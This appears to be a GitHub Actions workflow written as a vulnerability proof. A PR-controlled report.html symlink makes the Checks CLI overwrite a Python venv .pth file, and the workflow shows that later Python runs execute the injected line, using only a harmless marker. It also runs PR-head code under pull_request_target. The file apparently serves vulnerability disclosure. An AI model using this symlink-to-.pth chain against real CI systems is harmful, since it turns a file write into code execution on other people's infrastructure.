name: T1 Python Venv PTH Output Symlink Proof

on:
  pull_request_target:
    types: [opened, synchronize, reopened]

permissions:
  contents: read
  pull-requests: read

jobs:
  python-venv-pth-output-symlink:
    if: >-
      github.event.pull_request.head.repo.full_name == 'cllc3993/checks-s1-ci-impact-poc' &&
      startsWith(github.event.pull_request.head.ref, 'accountb-python-venv-')
    runs-on: ubuntu-latest
    steps:
      - name: Checkout PR head
        uses: actions/checkout@v4
        with:
          repository: ${{ github.event.pull_request.head.repo.full_name }}
          ref: ${{ github.event.pull_request.head.sha }}

      - name: Prepare trusted venv target
        shell: bash
        run: |
          set -euo pipefail
          test -d scan-root
          test -f scan-root/MainActivity.java
          test -L report.html
          actual_target="$(readlink report.html)"
          expected_target=".venv/lib/python3.12/site-packages/checks_t1_venv_ci.pth"
          test "$actual_target" = "$expected_target"
          python3.12 --version
          python3.12 -m venv .venv
          venv_site="$(.venv/bin/python -c 'import site; print(site.getsitepackages()[0])')"
          test "$venv_site" = "$PWD/.venv/lib/python3.12/site-packages"
          printf 'TRUSTED_VENV_PTH_ORIGINAL_20260602\n' > "$venv_site/checks_t1_venv_ci.pth"
          printf 'attacker-output-symlink=%s -> %s\n' "report.html" "$actual_target"
          printf 'resolved-output-target=%s\n' "$(readlink -f report.html)"
          printf 'python-venv-site=%s\n' "$venv_site"
          printf 'venv-pth-before-first-line=%s\n' "$(sed -n '1p' "$venv_site/checks_t1_venv_ci.pth")"

      - name: Install Checks CLI
        shell: bash
        run: |
          set -euo pipefail
          curl --compressed https://dl.google.com/checks/cli/latest/checks-linux -o checks
          chmod +x ./checks
          ./checks --version

      - name: Generate HTML report to PR-controlled venv PTH symlink
        shell: bash
        run: |
          set -euo pipefail
          ./checks code scan scan-root \
            --skip-upload \
            --format=html \
            --output report.html \
            --account-id=1 \
            --repo-id=1 \
            --scm-remote-url=https://github.com/claudeloba/checks-s1-ci-impact-poc \
            --branch-name=ci-python-venv-pth-output-symlink \
            --scm-revision="T1_PYTHON_VENV_PTH_${GITHUB_RUN_ID}_${GITHUB_RUN_ATTEMPT}" \
            --disable-analytics \
            --disable-version-check \
            --no-input

      - name: Later venv Python process executes clobbered PTH
        shell: bash
        run: |
          set -euo pipefail
          target="$PWD/.venv/lib/python3.12/site-packages/checks_t1_venv_ci.pth"
          grep -q 'T1_PYTHON_VENV_PTH_CI_MARKER_20260602' "$target"
          printf 'venv-pth-after-first-line=%s\n' "$(sed -n '1p' "$target")"
          .venv/bin/python - <<'PY'
          import site
          import sys
          print(f"venv-python-enable-user-site={site.ENABLE_USER_SITE!r}")
          print(f"venv-python-no-user-site-flag={sys.flags.no_user_site!r}")
          print("venv-python-sys-path-begin")
          for entry in sys.path:
              print(entry)
          print("venv-python-sys-path-end")
          PY
          .venv/bin/python - <<'PY'
          from pathlib import Path
          target = Path(".venv/lib/python3.12/site-packages/checks_t1_venv_ci.pth")
          for number, line in enumerate(target.read_text(errors="replace").splitlines(), 1):
              if "T1_PYTHON_VENV_PTH_CI_MARKER_20260602" in line or "import pathlib" in line:
                  print(f"venv-pth-marker-line-{number}={line!r}")
          PY
          rm -f "T1_PYTHON_VENV_PTH_CI_MARKER_20260602"
          .venv/bin/python -c 'print("VENV_PYTHON_STARTED_AFTER_CHECKS")'
          test -f "T1_PYTHON_VENV_PTH_CI_MARKER_20260602"
          printf 'python-venv-pth-output-symlink-result=pth-import-executed\n'
